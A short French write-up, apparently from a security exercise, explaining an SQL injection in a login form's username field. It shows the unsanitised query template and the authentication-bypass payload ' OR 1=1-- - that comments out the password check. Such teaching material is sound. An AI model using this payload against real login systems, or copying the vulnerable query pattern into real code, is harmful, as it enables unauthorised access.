# SQLi

Le seul champ injectable est le champs "login". Une injection SQL est présente !

```sql
SELECT uid FROM users WHERE username='{rq_username}' and password='{rq_passwd}';
```

Ainsi si on entre le nom d'utilisateur `jean` et le mot de passe `jeanjean2010`, on obtient la requête SQL suivante :
```sql
SELECT uid FROM users WHERE username='jean' and password='jeanjean2010';
```

Ainsi en insérant `' OR 1=1-- -` dans le champs username, on obtient :

```sql
SELECT uid FROM users WHERE username='' OR 1=1-- -' and password='jeanjean2010';
```

La condition `1=1` étant vraie et le mot de passe étant ignoré car `-- -` indique que tout ce qui suit sera mit en commentaire, la condition entière devient vraie et la requête nous renvoie un uid. Ainsi la requête exécutée est équivalente à :

```sql
SELECT uid FROM users;
```
